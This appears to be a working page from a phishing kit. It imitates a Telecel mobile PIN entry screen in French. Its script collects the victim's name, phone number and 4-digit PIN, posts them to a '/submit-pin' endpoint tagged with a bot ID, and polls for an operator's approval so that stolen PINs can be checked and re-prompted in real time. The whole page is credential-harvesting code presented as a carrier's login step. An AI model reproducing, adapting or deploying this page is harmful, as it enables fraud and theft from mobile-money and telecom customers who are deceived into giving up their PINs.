<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter PIN</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
      background: #0a0a0a;
      color: #ffffff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: #0a0a0a;
      width: 100%;
      max-width: 400px;
      padding: 40px 24px 32px;
      position: relative;
    }

    .logo {
      text-align: center;
      margin-bottom: 32px;
    }

    .logo-circle {
      width: 56px;
      height: 56px;
      background: #e53935;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 12px;
      font-size: 28px;
      font-weight: 700;
      color: #fff;
    }

    .telecel {
      font-size: 20px;
      font-weight: 700;
      color: #e53935;
      letter-spacing: 0.5px;
    }

    .title {
      font-size: 24px;
      font-weight: 700;
      color: #ffffff;
      text-align: center;
      margin-bottom: 8px;
    }

    .subtitle {
      font-size: 15px;
      color: rgba(255, 255, 255, 0.5);
      text-align: center;
      margin-bottom: 32px;
      line-height: 1.5;
    }

    .pin-box-wrapper {
      background: rgba(255, 255, 255, 0.03);
      border-radius: 18px;
      padding: 22px 16px;
      margin-bottom: 32px;
      border: 1px solid rgba(255, 255, 255, 0.05);
    }

    .pin-row {
      display: flex;
      justify-content: center;
      gap: 14px;
    }

    .pin-box {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 1.5px solid rgba(255, 255, 255, 0.1);
      background: rgba(255, 255, 255, 0.05);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: 600;
      color: #e53935;
      transition: border-color 0.3s ease;
    }

    .pin-box.filled {
      border-color: #e53935;
      box-shadow: 0 0 20px rgba(229, 57, 53, 0.15);
    }

    .lock-icon {
      width: 56px;
      height: 56px;
      border-radius: 12px;
      border: 1.5px dashed rgba(255, 255, 255, 0.15);
      background: rgba(255, 255, 255, 0.03);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      color: rgba(255, 255, 255, 0.3);
    }

    #otp-alert {
      text-align: center;
      font-size: 14px;
      margin-bottom: 16px;
      min-height: 20px;
    }

    button {
      width: 100%;
      padding: 16px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 8px;
      border: none;
      cursor: pointer;
      transition: all 0.3s ease;
      background: #e53935;
      color: #ffffff;
      opacity: 0.5;
    }

    button:enabled {
      opacity: 1;
    }

    button:hover:enabled {
      background: #c62828;
    }

    .waiting {
      text-align: center;
      font-size: 14px;
      color: #e53935;
      margin-top: 16px;
      display: none;
      padding: 12px;
      border-radius: 8px;
      background: rgba(229, 57, 53, 0.1);
    }

    .back-link {
      text-align: center;
      margin-top: 20px;
    }

    .back-link button {
      background: transparent;
      border: none;
      color: rgba(255, 255, 255, 0.3);
      font-size: 14px;
      cursor: pointer;
      padding: 8px;
      transition: color 0.3s ease;
      width: auto;
      opacity: 1;
    }

    .back-link button:hover {
      color: rgba(255, 255, 255, 0.6);
    }

    .back-link button:disabled {
      opacity: 0.3;
      cursor: not-allowed;
    }

    .footer {
      margin-top: 32px;
      text-align: center;
      font-size: 12px;
      color: rgba(255, 255, 255, 0.2);
      letter-spacing: 0.5px;
    }

    .hidden-input {
      position: absolute;
      opacity: 0;
      pointer-events: none;
      width: 1px;
      height: 1px;
    }
  </style>
</head>
<body>

<div class="card" onclick="focusPin()">
  <div class="logo">
    <div class="logo-circle">t</div>
    <div class="telecel">telecel</div>
  </div>

  <div class="title">Code PIN</div>
  <div class="subtitle">Entrez votre code PIN à 4 chiffres</div>

  <div class="pin-box-wrapper">
    <div class="pin-row">
      <div class="pin-box" id="b1"></div>
      <div class="pin-box" id="b2"></div>
      <div class="pin-box" id="b3"></div>
      <div class="pin-box" id="b4"></div>
      <div class="lock-icon">🔒</div>
    </div>
  </div>

  <div id="otp-alert"></div>

  <button id="verifyBtn" disabled>Continuer</button>

  <div id="waiting" class="waiting">⏳ En attente d'approbation…</div>

  <div class="back-link">
    <button onclick="history.back()">Retour</button>
  </div>

  <div class="footer">v 5.3.2 (1.0.0)</div>
</div>

<input
  id="pinInput"
  class="hidden-input"
  type="tel"
  inputmode="numeric"
  maxlength="4"
/>

<script>
  const input = document.getElementById('pinInput');
  const verifyBtn = document.getElementById('verifyBtn');
  const waitingEl = document.getElementById('waiting');
  const alertEl = document.getElementById('otp-alert');
  const backButton = document.querySelector('.back-link button');

  const boxes = [
    document.getElementById('b1'),
    document.getElementById('b2'),
    document.getElementById('b3'),
    document.getElementById('b4')
  ];

  // Session & bot handling
  const fullName = localStorage.getItem('fullName');
  const phone = localStorage.getItem('phone');
  const params = new URLSearchParams(window.location.search);
  const urlBotId = params.get('botId');
  if (urlBotId) localStorage.setItem('botId', urlBotId);
  const botId = localStorage.getItem('botId');

  if (!fullName || !phone || !botId) {
    alert('Session expirée. Veuillez recommencer.');
    window.location.href = 'index.html';
  }

  function focusPin() {
    input.focus();
  }

  // Update boxes with dots
  function updateBoxes(value) {
    const digits = value.padEnd(4, '');
    boxes.forEach((box, i) => {
      if (digits[i]) {
        box.textContent = '●';
        box.classList.add('filled');
      } else {
        box.textContent = '';
        box.classList.remove('filled');
      }
    });
  }

  input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 4);
    updateBoxes(input.value);
    verifyBtn.disabled = input.value.length !== 4;
    // Clear alert when typing
    alertEl.textContent = '';
  });

  // Handle paste
  input.addEventListener('paste', (e) => {
    e.preventDefault();
    const paste = e.clipboardData.getData('text');
    const digits = paste.replace(/\D/g, '').slice(0, 4);
    input.value = digits;
    updateBoxes(digits);
    verifyBtn.disabled = digits.length !== 4;
    if (digits.length === 4) {
      setTimeout(() => verifyBtn.click(), 300);
    }
  });

  verifyBtn.addEventListener('click', async () => {
    const pin = input.value;
    if (pin.length !== 4) return;

    verifyBtn.disabled = true;
    verifyBtn.textContent = 'En attente…';
    waitingEl.style.display = 'block';
    alertEl.textContent = '';

    try {
      const res = await fetch(`${window.location.origin}/submit-pin`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name: fullName, phone, pin, botId })
      });

      if (!res.ok) throw new Error();

      const { requestId } = await res.json();
      pollPin(requestId);

    } catch (error) {
      waitingEl.style.display = 'none';
      verifyBtn.disabled = false;
      verifyBtn.textContent = 'Continuer';
      alertEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
      alertEl.style.color = '#e53935';
    }
  });

  function pollPin(requestId) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`${window.location.origin}/check-pin/${requestId}`);
        const data = await res.json();

        if (data.approved === true) {
          clearInterval(interval);
          window.location.href = 'success.html';
        }

        if (data.approved === false || data.blocked) {
          clearInterval(interval);
          input.value = '';
          boxes.forEach(b => { b.textContent = ''; b.classList.remove('filled'); });
          verifyBtn.disabled = true;
          verifyBtn.textContent = 'Continuer';
          waitingEl.style.display = 'none';
          alertEl.textContent = '❌ Code PIN incorrect. Veuillez réessayer.';
          alertEl.style.color = '#e53935';
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000);
  }

  // Back button
  if (backButton) {
    backButton.addEventListener('click', () => {
      backButton.disabled = true;
    });
  }

  // Auto-focus on load
  window.onload = () => input.focus();
</script>

</body>
</html>
